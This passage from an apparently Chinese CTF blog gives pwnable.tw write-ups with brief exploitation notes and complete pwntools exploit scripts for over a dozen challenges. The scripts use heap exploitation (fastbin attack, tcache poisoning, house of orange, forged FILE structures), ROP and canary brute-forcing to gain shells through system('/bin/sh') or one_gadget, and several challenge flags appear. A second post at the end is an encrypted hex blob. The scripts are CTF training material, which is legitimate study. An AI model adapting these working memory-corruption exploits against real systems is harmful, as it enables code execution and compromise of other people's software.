10102) bin = ELF('./hacknote') libc = ELF('./libc_32.so.6')def z(a=''): gdb.attach(cn,a) if a == '': raw_input()def add(size,con): cn.sendline('1') cn.recvuntil('Note size :') cn.sendline(str(size)) cn.recvuntil('Content :') cn.send(con)def dele(idx): cn.sendline('2') cn.recvuntil("Index :") cn.sendline(str(idx))def show(idx): cn.sendline('3') cn.recvuntil("Index :") cn.sendline(str(idx))add(0x80,'a')#0add(0x80,'a')#1dele(0)add(0x80,'X')#2show(2)cn.recvuntil('X')cn.recv(3)if local: libc.address = u32(cn.recv(4))-48-0x1b2780else: libc.address = u32(cn.recv(4))-48-0x001B0780success('libc_base: '+hex(libc.address))system = libc.sym['system']dele(0)dele(1)pay = p32(system)+';/bin/sh\x00'add(0x90,pay)show(0)cn.interactive() 7.silver_bullet:思路：checksec看一下，没开canary和pie，8成是栈溢出了。后来找了半天，发现程序唯一的漏洞貌似就是strncat()的off-by-null 下次看到字符串操作函数时应该下意识地想到结尾处是否有off-by-null。scanf(&#39;%s&#39;)，strcat()，strncat()，strlen()与strcpy()结合等都有这个特点。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#coding:utf-8from pwn import *path = './silver_bullet'debug = 1attach = 0P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10103) libc = ELF('./libc.so.6')def new(content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('bullet :') p.send(content)def power(content): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('bullet :') p.send(content)def beat(): p.recvuntil('Your choice :') p.sendline('3')payload = '\x11'*0x2fnew(payload)payload = '\x11'power(payload)p_ebx = 0x08048475p_ebp = 0x08048a7bp_esi_edi_ebp = 0x08048a79leave = 0x08048558#gdb.attach(p,'''# b *0x08048952# b *0x08048A19# ''')payload = '\xff\xff\xff'payload+= p32(0xdeadbeef)payload+= p32(P.plt['puts'])payload+= p32(p_ebx)payload+= p32(P.got['puts'])payload+= p32(0x080484f0)power(payload)beat()p.recvuntil(' You win !!\n')libcbase = u32(p.recv(4)) - libc.sym['puts']log.success('libcbase = '+hex(libcbase))payload = '\x11'*0x2fnew(payload)payload = '\x11'power(payload)payload = '\xff\xff\xff'payload+= p32(0xdeadbeef)payload+= p32(libcbase+libc.sym['system'])payload+= p32(0xdeadbeef)payload+= p32(libcbase+libc.search('/bin/sh').next())power(payload)beat()if attach == 1: gdb.attach(p)p.interactive() 8.applestore:思路：非常规堆题，也是非常有价值的一题。需要我们更加深入地理解栈这个数据结构，其实拿到题目我们就可以发现没有free，且pie和relsro都没开，所以肯定是改got表了，没有free，那只能改atoi了，思路大致确定了，现在开始构思： leak：iphone8的结构体我们都可以控制，这一点应该都能想到，然后用show功能，可以泄露libc和stack。主要是怎么改atoi_got。 hijack：这里发现题目的特点：一是没有free，二是没有常规输入点，只有一个my_read，可以往栈上写有限长度的数据。 再仔细观察发现，delete里有unlink的漏洞，但是直接把system_addr写入got表，但是把got表写入system_addr时就会报错。。。所以这条路就gg了，想了蛮久的。。。还是没思路。后来看了wp，emmmm，不得不佩服tw的出题人，真的nb，ebp对于栈的意义真的蛮重要的。 总结： 在hijack时，我们要把目光聚焦在输入点上，想办法怎么劫持输入点到我们想输入的地方。 bp指针对于栈变量起着寻址的作用，改写了bp，向栈变量输入数据时，就等于向劫持后的地址写数据。所以把bp劫持到got附近或者hook附近是不是都很危险？ exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#coding:utf-8from pwn import *path = './applestore'debug = 0attach = 0P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10104) libc = ELF('./libc.so.6')def new(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('Number&gt; ') p.sendline(str(index))def show(): p.recvuntil('&gt; ') p.sendline('4') p.recvuntil(') &gt; ') p.sendline('y')def delete(index): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('Item Number&gt; ') p.sendline(str(index))def checkout(): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil(') &gt; ') p.sendline('y')for i in range(10): new(4)for i in range(16): new(1)checkout()p.recvuntil('&gt; ')p.sendline('4')p.recvuntil(') &gt; ')payload = 'y\x00'+p32(P.got['atoi'])+p32(1)+p32(0)+p32(0)p.send(payload)p.recvuntil('27: ')libcbase = u32(p.recv(4)) - libc.sym['atoi']log.success('libcbase = '+hex(libcbase))p.recvuntil('&gt; ')p.sendline('4')p.recvuntil(') &gt; ')payload = 'y\x00'+p32(libcbase+libc.sym['environ'])+p32(1)+p32(0)+p32(0)p.send(payload)p.recvuntil('27: ')stack_addr = u32(p.recv(4)) log.success('stack_addr = '+hex(stack_addr))ebp = stack_addr - 0x104atoi_got = P.got['atoi']log.success('ebp = '+hex(ebp))payload = '27'+p32(libcbase+libc.sym['environ'])+p32(1)+p32(ebp-0xc)+p32(atoi_got+0x20-2)p.recvuntil('&gt; ')p.sendline('3')p.recvuntil('Item Number&gt; ')p.send(payload)p.recvuntil('&gt; ')p.send('sh\x00\x00'+p32(libcbase+libc.sym['system']))if attach == 1: gdb.attach(p)p.interactive() 9.tcache_tear:思路：常规堆题，2.27环境。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#coding:utf-8from pwn import *path = './tcache_tear'debug = 0attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10207) libc = ELF('./libc.so.6')def new(size,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Data:') p.send(content)def delete(): p.recvuntil('Your choice :') p.sendline('2')def show(): p.recvuntil('Your choice :') p.sendline('3')p.recvuntil('Name:')p.send('xiaoxiaorenwu')new(0x60,'\x00')delete()delete()new(0x60,p64(0x602020))new(0x60,'\x00')new(0x60,'\x60')new(0x60,p64(0xfbad1800)+'\x00'*0x19)p.recv(8)#if debug == 1:libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fa2612bf8b0-0x00007fa260ed2000)log.success('libcbase = '+hex(libcbase))#else:# libcbase = u64(p.recv(6).ljust(8,'\x00')) - 88 - 0x3EBC40# log.success('libcbase = '+hex(libcbase))new(0x50,'\x00')delete()delete()new(0x50,p64(libcbase+libc.sym['__free_hook']-0x10))new(0x50,'\x00')new(0x50,'/bin/sh\x00'+p64(0)+p64(libcbase+libc.sym['system']))delete()if attach == 1: gdb.attach(p)p.interactive() 10.seethefile思路：首先需要知道/proc/self/maps文件记录着当前进程的虚拟地址信息，用这个可以泄露。 其次需要对fclose源码有一定程度的了解，需要知道里面调用了什么虚函数，这里有兴趣的自己去阅读吧，也没什么好说的，需要注意的就是_flags的构造，需要对着源码来使逻辑走到自己需要的分支，我是调用了vtable中的_IO_FINISH拿的shell，用__close同样也可以。 exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#coding:utf-8from pwn_debug import *pdbg = pwn_debug('./seethefile')local = 1pdbg.local()#pdbg.debug('2.23')pdbg.remote('chall.pwnable.tw',10200)pdbg.context(os='linux',terminal=['terminator','-x','sh','-c'])pdbg.context.log_level = 'debug'if local == 1: p = pdbg.run('local') libc = pdbg.libc P = pdbg.elfelse: p = pdbg.run('remote')def Open(filename): p.recvuntil('choice :') p.sendline('1') p.recvuntil('want to see :') p.sendline(filename)def Read(): p.recvuntil('choice :') p.sendline('2')def Write(): p.recvuntil('choice :') p.sendline('3')Open('/proc/self/maps')Read()Write()p.recvuntil('\n')p.recvuntil('\n')p.recvuntil('\n')heapbase = int(p.recv(8),16)log.success('heapbase = '+hex(heapbase))p.recvuntil('\n')p.recvuntil('\n')libcbase = int(p.recv(8),16)log.success('libcbase = '+hex(libcbase))name_addr = 0x0804B260fp_addr = 0x0804B280 #pdbg.bp(0x08048AE5)p.recvuntil('choice :')p.sendline('5')p.recvuntil('your name :')payload = 'xiaoxiaorenwu'payload = payload.ljust(0x20,'\x00')payload+= p32(0x0804B284)payload+= '\x11\x80;s' + 'h\x00\x00\x00' payload+= p32(0)*8payload+= p32(0)+p32(0)payload+= p32(0)+p32(libcbase+(0xf7f6bcc0-0xf7db9000))payload+= p32(3)+p32(0)payload+= p32(0)+p32(0)payload+= p32(0)+p32(0)payload+= p32(0xffffffff)+p32(0)payload+= p32(0)+p32(0)payload+= p32(0)+p32(0)payload+= p32(0xffffffff)+p32(0)payload+= p32(0)+p32(libcbase+libc.sym['system'])payload+= p32(0)*7+p32(0x0804B284+0x6c)p.sendline(payload)p.interactive() 11.DeathNote12.StarBound理清逻辑花了半天，其实说是理清，其实multiplayer里面的逻辑都没看，因为题目说了这个功能无法实现，所以应该和做题无关了，但是感觉这道题原本是一道非常有趣的题目，还可以多人联机做题？？？这个思路挺有趣的，看能不能出一题。。。 思路：首先在main函数里，readn(&amp;nptr,0x100u)，一看就不对劲，谁没事开那么大的栈给你输入一个choice。。。所以这个地方八成是让我们来放自己的数据的(八成是ropchain。。。32位的ropchain也不需要这么大的栈啊。。)，然后就是输入choice时可以溢出，正向反向都可以。。。反向可以溢出到bss段上的user_name，是我们可控的，所以我们可以在user_name上放GOT和gadget来通过溢出调用，再结合ropchain，就变得很简单了。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8from pwn_debug import *pdbg = pwn_debug('./starbound')local = 0pdbg.local()pdbg.remote('chall.pwnable.tw',10202)pdbg.context(os='linux',terminal=['terminator','-x','sh','-c'])pdbg.context.log_level = 'debug'if local == 1: p = pdbg.run('local') libc = pdbg.libc P = pdbg.elfelse: p = pdbg.run('remote') P = ELF('./starbound') libc = ELF('/lib/i386-linux-gnu/libc.so.6')#pdbg.bp([0x0804A65D])add_esp = 0x08048e48bss = 0x080580D0p.recvuntil('&gt; ')p.sendline('6')p.recvuntil('&gt; ')p.sendline('2')p.recvuntil('name: ')p.send(p32(P.plt['puts'])+'\x00')p.recvuntil('&gt; ')p.send('-33a'+28*p32(0x11111111)+p32(0x22222222))p.recvuntil('\x22\x22\x22\x22')libcbase = u32(p.recv(4)) - libc.sym['getenv'] - 28log.success('libcbase = '+hex(libcbase))system_addr = libcbase + libc.sym['system']payload = p32(system_addr) + p32(0xdeadbeef) + p32(bss+4)p.recvuntil('&gt; ')p.sendline('2')p.recvuntil('name: ')p.send(p32(add_esp)+'/bin/sh\x00')p.recvuntil('&gt; ')p.send('-33a'+p32(0x11111111)+payload)#FLAG&#123;st4r_st4r_st4r_b0und&#125;p.interactive() 13.Babystack思路：只看透了第一层，copy和login函数的栈空间重叠，栈变量未初始化导致脏数据残留，溢出。 但是之后就没了思路。。。看了V爷爷的wp才知道原来是可以爆破的。。。这一点是我从来没想过的，只想到\x00可以绕过密码检测，没想到可以和while循环结合在一起爆破出密码，泄露也很巧妙，同样是利用脏数据溢出，将libc地址放到canary上，然后像爆破canary一样爆破出libc。。。自己做实在是想不到。。。orz。。。膜拜QAQ exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#coding:utf-8from pwn_debug import *pdbg = pwn_debug('./babystack')local = 0pdbg.local('./libc_64.so.6')pdbg.remote('chall.pwnable.tw',10205)pdbg.context(os='linux',terminal=['terminator','-x','sh','-c'])pdbg.context.log_level = 'debug'if local == 1: p = pdbg.run('local') libc = pdbg.libc P = pdbg.elfelse: p = pdbg.run('remote') libc = ELF('./libc_64.so.6')def guess_canary(): canary = '' for j in range(0x10): for i in range(0x1,0x100): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('Your passowrd :') p.send(canary+chr(i)+'\x00') recv = p.recvline() if "Login Success !" in recv: canary += chr(i) p.recvuntil('&gt;&gt; ') p.sendline('1') break return canarydef leak_libc(): libcbase = '\x11\x11\x11\x11\x11\x11\x11\x11' for j in range(6): for i in range(0x1,0x100): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('Your passowrd :') p.send(libcbase+chr(i)+'\x00') recv = p.recvline() if "Login Success !" in recv: libcbase += chr(i) p.recvuntil('&gt;&gt; ') p.sendline('1') break return libcbasecanary = guess_canary()p.recvuntil('&gt;&gt; ')p.sendline('1')p.recvuntil('Your passowrd :')payload = canary + '\x00'payload = payload.ljust(0x48,'\x11')p.send(payload)p.recvuntil('&gt;&gt; ')p.sendline('3')p.recvuntil('Copy :')p.send('\x11'*0x3F)p.recvuntil('&gt;&gt; ')p.sendline('1')lib = u64(leak_libc()[8:].ljust(8,'\x00'))libcbase = lib - libc.sym['_IO_file_setbuf'] - 9log.success('libcbase = '+hex(libcbase))#========================================================one_gadget = [0x45216,0x4526a,0xef6c4,0xf0567]p.recvuntil('&gt;&gt; ')p.sendline('1')p.recvuntil('Your passowrd :')payload = '\x00'payload = payload.ljust(0x68,'\x11')payload+= p64(libcbase + one_gadget[0]) p.send(payload)p.recvuntil('&gt;&gt; ')p.sendline('3')p.recvuntil('Copy :')p.send('\x11'*0x3F)#========================================================p.recvuntil('&gt;&gt; ')p.sendline('1')p.recvuntil('&gt;&gt; ')p.sendline('1')p.recvuntil('Your passowrd :')payload = '\x00'payload = payload.ljust(0x40,'\x11')payload+= canary + '\x00' p.send(payload)p.recvuntil('&gt;&gt; ')p.sendline('3')p.recvuntil('Copy :')p.send('\x11'*0x3F)p.recvuntil('&gt;&gt; ')p.sendline('2')#FLAG&#123;Its_juS7_a_st4ck0v3rfl0w&#125;p.interactive() 14.Spirited Away思路：sprintf的一字节溢出，妈的，这个输入输出调到我自闭orz。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#coding:utf-8from pwn_debug import *pdbg = pwn_debug('./spirited_away')local = 1pdbg.local()pdbg.remote('chall.pwnable.tw',10204)pdbg.context(os='linux',terminal=['terminator','-x','sh','-c'])pdbg.context.log_level = 'debug'if local == 1: p = pdbg.run('local') libc = pdbg.libc P = pdbg.elfelse: p = pdbg.run('remote') libc = ELF('/libc_32.so.6')def one(name,age,reason,comment): p.recvuntil('name: ') p.send(name) p.recvuntil('age: ') p.sendline(str(age)) p.recvuntil('movie? ') p.send(reason) p.recvuntil('omment: ') p.send(comment)one('xxrw',20,'\x11'*4*14,'\x22')p.recvuntil('\x11'*4*14)stack_addr = u32(p.recv(4))log.success('stack_addr = '+hex(stack_addr))p.recvuntil('ent? &lt;y/n&gt;: ')p.send('y')#============================================================one('xxrw',20,'\x11'*4*16,'\x22')p.recvuntil('\x11'*4*16)libcbase = u32(p.recv(4)) - libc.sym['fflush'] - 11log.success('libcbase = '+hex(libcbase))p.recvuntil('ent? &lt;y/n&gt;: ')p.send('y')#=============================================================for i in range(100): one('xxrw',0,'\x00','\x00') p.recvuntil('Would you like to leave another comment? &lt;y/n&gt;:') p.send('y')reason = '\x00'*5reason+= p32(0) + p32(0x41) + '\x00'*0x38 + p32(0) + p32(0x11)heap_addr = stack_addr - 0x60comment = '\x00'*0x50 + '\x11'*4 + p32(heap_addr)one('xxrw',20,reason,comment)p.recvuntil('? &lt;y/n&gt;: ')p.send('y')pdbg.bp(0x080488D3)payload = '\x11'*0x44 payload+= p32(libcbase+libc.sym['system'])payload+= p32(0xdeadbeef) + p32(libcbase+libc.search('/bin/sh\x00').next()) one(payload,20,'\x00','\x00')p.recvuntil('? &lt;y/n&gt;: ')p.send('n')#FLAG&#123;Wh4t_1s_y0ur_sp1r1t_1n_pWn&#125;p.interactive() 15.sercetgarden:思路：常规GLibc_heap题，利用fastbin_attack即可。 exp如下:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#coding:utf-8from pwn import *path = './secretgarden'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 0: p = process(path,env = &#123;'LD_PRELOAD':'./libc.so.6'&#125;) if context.arch == 'amd64': #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('./libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10203) libc = ELF('./libc.so.6')def new(size,name,color): p.recvuntil('Your choice : ') p.sendline('1') p.recvuntil('name :') p.sendline(str(size)) p.recvuntil('flower :') p.send(name) p.recvuntil('flower :') p.sendline(color)def delete_one(index): p.recvuntil('Your choice : ') p.sendline('3') p.recvuntil('garden:') p.sendline(str(index))def show(): p.recvuntil('Your choice : ') p.sendline('2')def delete_all(): p.recvuntil('Your choice : ') p.sendline('4')new(0x80,'\x00'*0x10,'a'*0x10)new(0x80,'\x00'*0x10,'a'*0x10)delete_one(0)delete_one(1)delete_all()new(0x80,'\x11'*8,'a'*0x10) #0show()p.recvuntil('\x11'*8)libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fbbc4111b78-0x00007fbbc3d4d000) + 0x1000log.success('libcbase = '+hex(libcbase))new(0x60,'\x00'*0x10,'a'*0x10) #1new(0x60,'\x00'*0x10,'a'*0x10) #2new(0x60,'\x00'*0x10,'a'*0x10) #3delete_one(1)delete_one(2)delete_one(1)new(0x60,p64(libcbase+libc.sym['__malloc_hook']-11),'a'*0x10) #4new(0x60,'\x00'*0x10,'a'*0x10) #5new(0x60,'\x00'*0x10,'a'*0x10) #6new(0x60,'\x00'*0xb+p64(0)*5+p64(0x70)+p64(libcbase+(0x7f775b9b1b40-0x7f775b5ed000)-0x1000),'a'*0x10) #7new(0x60,p64(0)*5+p64(libcbase+libc.sym['__free_hook']-0xb58),'a'*0x10)new(0x300,'/bin/sh\x00','\x00'*0x10) #9new(0x300,'\x00','\x00'*0x10) #10new(0x300,'\x00','\x00'*0x10)new(0x200,'\x00'*(0x7a8-0x620-0x30) +p64(libcbase+libc.sym['system']),'\x00'*0x10)delete_one(9)if attach == 1: gdb.attach(p)p.interactive() 16.Alive_Note17.BookWriter思路：libc_2.23中house of orange的运用。 2.23下的house of orange的利用分为几个步骤： 利用syscall获得unsortedbin_chunk。 泄露libcbase和heap_addr。 伪造fake_file，fake_file的头部伪造为/bin/sh\x00+p64(0x61)，vtable里的第三个位置伪造为system。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *name = "./bookwriter"local = 0if local == 1: p = process(name,env=&#123;'LD_PRELOAD':'./libc_64.so.6'&#125;) libc = ELF("./libc_64.so.6")else: p = remote("chall.pwnable.tw",10304) libc = ELF("./libc_64.so.6") def setname(c = "nier"): p.sendafter("Author :",c)def cmd(c): p.sendlineafter("choice :",str(c))def add(size,c = "nier"): cmd(1) p.sendlineafter("page :",str(size)) p.sendafter("Content :",c)def show(idx): cmd(2) p.sendlineafter("page :",str(idx))def edit(idx,c): cmd(3) p.sendlineafter("page :",str(idx)) p.sendafter("Content:",c)setname("A"*0x40)cmd(1)p.sendlineafter("page :",'0')add(0x28)#1edit(1,"A"*0x28)edit(1,"A"*0x28+'\xb1'+'\x0f'+'\x00')add(0x1008,"A"*0x10)#2add(0x28,"A")#3show(3)p.readuntil("Content :\n")base = u64(p.readline()[:-1].ljust(8,'\x00')) - (0x7ffff7dd2141-0x00007ffff7a0d000) + 0x1000edit(3,"A"*0x10)show(3)p.readuntil("A"*0x10)heap = u64(p.readline()[:-1].ljust(8,'\x00')) - 0x50add(0x28)add(0x28)add(0x28)add(0x28)add(0x28,"A"*0x28)libc.address = basefake_struct_address = 0x603170 - 0x603000 + heapfake_struct = "/bin/sh\x00" + p64(0x61)fake_struct+= p64(libc.symbols['system']) + p64(libc.symbols['_IO_list_all']-0x10)fake_struct+= p64(0)+p64(1)fake_struct = fake_struct.ljust(0xa0,'\x00') + p64(fake_struct_address+0x8)fake_struct = fake_struct.ljust(0xc0,'\x00') + p64(1)fake_struct = fake_struct.ljust(0xd8,'\x00') + p64(fake_struct_address+0xd8-0x10) + p64(libc.symbols['system'])edit(0,"\x00"*(0x603170-0x603010) + fake_struct + '\n')cmd(1)p.sendlineafter("page :",str(1))p.interactive() 18.CAVO19.heap_paradise思路：中档技巧堆，没啥好说的。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding:utf-8from pwn_debug import *pdbg = pwn_debug('./heap_paradise')local = 0pdbg.local('./libc_64.so.6')pdbg.remote('chall.pwnable.tw',10308)pdbg.context(os='linux',terminal=['terminator','-x','sh','-c'])#pdbg.context.log_level = 'debug'def new(size,content): p.recvuntil('You Choice:') p.sendline('1') p.recvuntil('Size :') p.sendline(str(size)) p.recvuntil('Data :') p.send(content)def delete(index): p.recvuntil('You Choice:') p.sendline('2') p.recvuntil('Index :') p.sendline(str(index))def exp(): new(0x68,p64(0)*11+p64(0x71)) #0 new(0x68,p64(0)*11+p64(0x21)) #1 new(0x68,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)) #2 delete(0) delete(1) delete(0) new(0x68,'\x60') #3 new(0x68,p64(0)) #4 new(0x68,p64(0)) #5 new(0x68,p64(0)) #6 delete(1) delete(6) new(0x68,p64(0)+p64(0x91)) #7 delete(1) delete(6) new(0x68,p64(0)+p64(0x71)+'\xdd\x25') #8 new(0x68,p64(0)) #9 new(0x68,p64(0)*6+'\x00'*3+p64(0xfbad1800)+p64(0)*3+'\x00') #10 p.recv(0x40) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7ffff7dd2600-0x7ffff7a0e000) log.success('libcbase = '+hex(libcbase)) delete(0) delete(2) delete(0) new(0x68,p64(libcbase+libc.sym['__malloc_hook']-0x23)) new(0x68,p64(0)) new(0x68,p64(0)) one_gadget = [0x4526a,0x45216,0xf0567,0xef6c4] new(0x68,'\x00'*0x13+p64(libcbase+one_gadget[3])) #14 p.sendlineafter("Choice:",'1') p.sendlineafter('Size :','0')while True: try: if local == 1: p = pdbg.run('local') libc = pdbg.libc P = pdbg.elf else: p = pdbg.run('remote') libc = ELF('./libc_64.so.6') exp() break except: p.close()#FLAG&#123;W3lc0m3_2_h3ap_p4radis3&#125;p.interactive() 20.MnO2不放出 21.Secret of my heart思路：挺简单的一题。。。感觉tw有时候会出现分值和难度不匹配的情况。 exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#coding:utf-8from pwn import *context(os='linux',arch='amd64')context.log_level='debug'debug = 0if debug: p = process('./secret_of_my_heart')#,env=&#123;'LD_PRELOAD':'./libc_64.so.6'&#125;)else: p = remote('chall.pwnable.tw',10302)P = ELF('./secret_of_my_heart')libc = ELF('./libc_64.so.6')def new(length,name,payload): p.recvuntil('choice :') p.sendline('1') p.recvuntil('heart : ') p.sendline(str(length)) p.recvuntil('Name of heart :') p.sendline(name) p.recvuntil('secret of my heart :') p.send(payload)def view(index): p.recvuntil('choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(index))def delete(index): p.recvuntil('choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(index))new(0x28,'xqh','\x00'*0x28) #0new(0x100,'xqh','\x00'*0xf0+p64(0x100)+p64(0x10)) #1new(0x100,'xqh','\x02'*0xf0) #2new(0x38,'xqh','\x03'*0x30) #3delete(1)delete(0)new(0x28,'xqh','/bin/sh\x00'+'\x00'*0x20) #0new(0x80,'xqh','\x03'*0x70) #1new(0x60,'xqh','\x04'*0x30) #4 0xd0delete(1)delete(2)new(0x10,'xqh','\x01'*0x28) #1 new(0x60,'xqh','\x02'*0x28) #2view(4)p.recvuntil('Secret : ')main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - 88libcbase = main_arena_addr - 0x3c3b20log.success('main_arena_addr = '+hex(main_arena_addr))log.success('libcbase = '+hex(libcbase))realloc_addr = libcbase + libc.symbols['__libc_realloc']log.success('realloc_addr = '+hex(realloc_addr))free_hook = libcbase + libc.symbols['__free_hook']log.success('free_hook = '+hex(free_hook))system_addr = libcbase + libc.symbols['system']log.success('system_addr = '+hex(system_addr))new(0x60,'xqh','\x05'*0x28) #5delete(5)delete(2)delete(4)new(0x60,'xqh',p64(main_arena_addr-0x20+5)) #2new(0x60,'xqh','\x04'*0x10) #4new(0x60,'xqh','\x05'*0x10) #5new(0x60,'xqh','\x00'*0x1b+p64(0)+p64(0x71)*3+p64(main_arena_addr+0x20)) #6new(0x60,'xqh','\x00'*0x28+p64(free_hook-0xb58)) #7for i in range(19): new(0x90,'xqh','\x00'*0x80)new(0x90,'xqh','\x00'*0x8+p64(system_addr))delete(0)p.interactive() 22.Kidding不放出 23.WananHeap不放出 24.Printable不放出 25.Breakout不放出 26.GhostParty不放出 27.De-ASLR不放出 28.unexploitable不放出 29.BabyAllocator不放出 30.OmegaGo不放出 36.criticalheap &amp;&amp; criticalheap++不放出]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flag{H@ppy_N3w_Ye4r_QAQ}]]></title>
    <url>%2F2020%2F01%2F01%2Fflag-H-ppy-N3w-Ye4r-QAQ%2F</url>
    <content type="text"><![CDATA[私人空间，谢绝访问 9c5f2433c2fac15aa72cd3c028952b1d8b9e6b1ed0409b969059b8088d5e6d060991c0ae72fc520422b1c2faf131e990cc405c67138198e3048ea91583b61ebfb9ff4d74ea2d823044a80e4f0cdd5a39039b274f322edaf6b2ad686a44d42153b29ddd09da88873b0359d10030250d27f3da907d1d1cf2b3f5b5f1116f006e1b113dd91af26e36c2b4f85f0f4852a046d98c206fd6508bd33d6ebc3b5d12f93100d7a298045026c8c47ae725adf5d51a6bf07cf8463551cc1333e16ebd45613db0d272b8525569ca539d88a92a36239966c026bbb9c548ffb5db6b55bdeb8f3aba64adf0a5aeb0fab963d5675dc8fb80ca07509c1954387cfe0e0d1d64e9423c465aa985dd67ea5c9c94a3c2dfa02acc1c532f7796f098abba23aa66f5d33d4f751a810561f59aa6ec5be56ca01975b6cb1dc7a24e5e721d53b4794eda098edc5e7be2bfdbfe50bdfa879d32ecb66184a23ca4d95370c20497c1077b7a86a09722a31c116f8d6bf11b5cb75a82fab9a8ab1a2fc0c4ede26c00767cf56595dd640a684f9e45badcf130e950644f10e6afb5c10c73d33fceee43b6495f97afeed08539672902c0f7f9e725f2d2f6f1015d83bd984113d1fe6b5139fa888adb32e35370d6fc67f787f086c2394ea226ded60d02900cca4caf5083749ceec8bfc9618f8a1506d5fe3cae5dded07cb310457380b3df6f831dd7e02fc76b0337fb4802a651c2722ddde37de1579c4265402120d94b74b90596fe2dd333f4f98bcbd30327e58c3ba298b1fcfc8badf29f099d06cfa83c1b9e6933ded729c305e28026809f1fa4aa9628e14d1d73fe845e89f5ac0b3ed263c1298d58e41949de1c2863336ea35acf52608b879b6ffe0adad33ec026d0ce96ec5c08e3d29b581b78ed15f907866db508ee2af1748777ca32167700ff3bd5132952a35f618ef65a52f114e453d1d5fc1a57399665a01c0c52855f4cf2f41f8dfe25062ed927df5055903de759dbd6f9605f35f09f7fdafe4b277915526fe51ae19547bcaa28fd82f27d23784716f2b4c136ce4999b65681e6f743581ba34ae3f6f05d94f6dfa9f68c333ac17a81e8e991fdf8f03a6e007aa05d79ed65b14a7efd9d4379f7fdd6d6290baad0fe5080f6b593ab6a466853904333dd502c21130818484012240dbb51e2cb9eeb08087b42af0e920189d305ab446a212993e1c97cd271e9c3f1253081defbc7c8459386563561499b160de77403aba91292ec53c9e67a437c9575db05306419b9aad78070ea8a626657fea90c3b8a5c06ffb88b5e4d318334ac7c7d47354dc2040461dad96e17165f1ac8b0be7009ca5e7b9cdb78868aabede905e363821eb2d881e477a811fe9873c68bcb9eac1a02ca8ecb6a53f638a81cb981912fc93abc8f7c2fe020a7c3b772c2c9edde172a3a232b919829c9af5f7d1320c8a7b3b9786c44e191fea161073a6c83cb25658fefa66fe9b2888ffcbccda8678664ecc2c31dc52f70e2ac6de47067485fbea8f0fd68379437364e0a1b52c9e0b7a97a74310380aba93863f8933cb168ad843240f6241c62290b56f58be2d1cb359416ecbb98256ed30d33d9a7547569e39021d9d67ec008722f571621a4f9c137d9169fb51821e795a6d28f07d879e390ff37d6c9f3cfa6cc5d3bcba887af7f079059c5fbbb56d18e40e539807fd5c61fec802dce80561307e3372785f6f599e80faba767e71f292ea64df61145f1c7c6f906881031911927a828e3e9d906a9f897da895dc42c8b6c135c5525a844fac9bed42942a1f297c7bc43deec6c6155f44dfefe746e6ff386c7c59eb100cf5fcb832c5c7e5d407af96099ab0dc66d39c51f14269e16afbcd71d96e4118ef52454182e5095cf1560d68b535085b5bd617824294e067973e78910c9f549445195658727dc6b625fa6fd59af422e4322660f42a9e2570ab590dcd86a257936b7f97b05952065f0b3db264e9ff460046939afc5c8d8010d758b3c088c752b5c886f9318f4f3880a4203d7c8532d15b86a04ae03393dfe170bcfa8d7dc2de9c67775f6d586006a43036675f46807cda5c5dc8adafb727e837bf40e1e8eff5f0f6b9298a3f47272d7499b0e0d